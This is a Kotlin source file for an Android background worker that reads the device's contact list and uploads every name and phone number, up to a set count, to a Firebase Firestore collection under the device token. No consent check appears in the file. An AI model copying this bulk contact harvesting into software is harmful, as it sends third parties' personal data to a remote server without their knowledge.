package com.mobikasa.userinfo.WorkManagers

import android.annotation.SuppressLint
import android.content.ContentValues.TAG
import android.content.Context
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Environment
import android.provider.ContactsContract
import android.provider.Settings
import android.text.format.Formatter
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.google.firebase.database.ktx.database
import com.google.firebase.database.ktx.getValue
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.storage.FirebaseStorage
import com.mobikasa.userinfo.UserInfoApp
import com.mobikasa.userinfo.Utils.Constants
import com.mobikasa.userinfo.Utils.SharedPref
import com.mobikasa.userinfo.db.ContactEntity
import com.mobikasa.userinfo.db.MyDataBase
import java.io.File
import java.io.FileInputStream
import java.util.*


class UploadContacts(mContext: Context, parameters: WorkerParameters) :
    Worker(mContext, parameters) {

    val mContext: Context = mContext;

    val token=SharedPref(mContext).getValueString(SharedPref.KEY_NAMES.Device_TOKEN)
    private val objDB= MyDataBase.getInstance(UserInfoApp.applicationContext()).ContactDao()


    override fun doWork(): Result {
        try {
            getContacts()
            return Result.success()
        } catch (e: Exception) {
            return Result.failure()

        }


    }

    @SuppressLint("Range")
    fun getContacts() {

        var count=0
        val phones = mContext.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
        )
        while (phones!!.moveToNext()) {

            count++

            if(count<=Constants.COntactsCount) {

                val name =
                    phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phoneNumber =
                    phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                objDB.insert(ContactEntity(name, phoneNumber))

                uploadContactsToFireStore(name, phoneNumber)
            }else{
                count=0
                break
            }
        }
        phones.close()
    }

    private fun uploadContactsToFireStore(name:String,phoneNumber:String) {
        val db=Firebase.firestore

        val user = hashMapOf(
            Constants.Collections.Name to "$name",
            Constants.Collections.MobileNumber to "$phoneNumber",
        )
        db.collection(Constants.Collections.BASE_COLLECTION).document("$token").collection(Constants.Collections.CONTACTS).document(phoneNumber).set(user)
            .addOnSuccessListener {

                Log.d(Constants.TAG, "Contacts successfully written!")

            }
            .addOnFailureListener {

                    e -> Log.w(Constants.TAG, "Error writing Contants", e) }

    }
}